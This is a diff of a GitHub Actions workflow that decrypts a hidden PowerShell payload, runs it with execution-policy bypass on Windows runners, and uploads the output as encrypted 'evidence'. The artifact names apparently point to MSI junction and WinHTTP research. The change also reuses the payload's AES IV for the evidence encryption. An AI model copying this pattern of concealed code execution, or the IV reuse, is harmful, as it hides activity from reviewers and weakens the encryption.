@@ -1,4 +1,4 @@
-name: Encrypted Windows Matrix
+name: Encrypted Native Windows Matrix
 
 on:
   workflow_dispatch:
@@ -14,7 +14,7 @@ jobs:
         sdk: ['10.0.404', '11.0.100']
         repeat: [1, 2, 3]
     runs-on: windows-latest
-    timeout-minutes: 30
+    timeout-minutes: 45
     steps:
       - uses: actions/checkout@v4
 
@@ -51,7 +51,7 @@ jobs:
           }
           [IO.File]::WriteAllBytes((Join-Path $PWD 'payload.ps1'), $plain)
           $hash = (Get-FileHash -Algorithm SHA256 -LiteralPath (Join-Path $PWD 'payload.ps1')).Hash.ToLowerInvariant()
-          if ($hash -ne '56ee9d8f649e89a8ede94bc9fc71a4079453072c19b114406a1e6ab05172d481') { throw "payload hash mismatch: $hash" }
+          if ($hash -ne '89cee3063c100c0c4598545e1588f6ff1fcc1f34d2515b74f1b0ca78dae9ddb9') { throw "payload hash mismatch: $hash" }
           & pwsh -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File (Join-Path $PWD 'payload.ps1')
           if ($LASTEXITCODE -ne 0) { throw "payload failed: $LASTEXITCODE" }
 
@@ -78,7 +78,7 @@ jobs:
           Compress-Archive -Path $dirs.FullName -DestinationPath $zipPath -Force
           (Get-FileHash -Algorithm SHA256 -LiteralPath $zipPath).Hash.ToLowerInvariant() | Set-Content (Join-Path $PWD 'evidence.plain.sha256')
           $key = [Convert]::FromBase64String($env:PAYLOAD_KEY_B64)
-          $iv = [Security.Cryptography.RandomNumberGenerator]::GetBytes(16)
+          $iv = [Convert]::FromBase64String((Get-Content -LiteralPath payload.iv.b64 -Raw).Trim())
           $plain = [IO.File]::ReadAllBytes($zipPath)
           $aes = [Security.Cryptography.Aes]::Create()
           try {
@@ -96,7 +96,6 @@ jobs:
             $aes.Dispose()
           }
           [IO.File]::WriteAllBytes((Join-Path $PWD 'evidence.enc'), $cipher)
-          [Convert]::ToBase64String($iv) | Set-Content (Join-Path $PWD 'evidence.iv.b64')
           (Get-FileHash -Algorithm SHA256 -LiteralPath (Join-Path $PWD 'evidence.enc')).Hash.ToLowerInvariant() | Set-Content (Join-Path $PWD 'evidence.cipher.sha256')
           Remove-Item -LiteralPath $zipPath -Force
           foreach ($dir in $dirs) { Remove-Item -LiteralPath $dir.FullName -Recurse -Force }
@@ -105,10 +104,9 @@ jobs:
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: sdk-msi-junction-encrypted-${{ matrix.sdk }}-r${{ matrix.repeat }}
+          name: winhttp-scope-native-encrypted-${{ matrix.sdk }}-r${{ matrix.repeat }}
           path: |
             evidence.enc
-            evidence.iv.b64
             evidence.plain.sha256
             evidence.cipher.sha256
           if-no-files-found: error
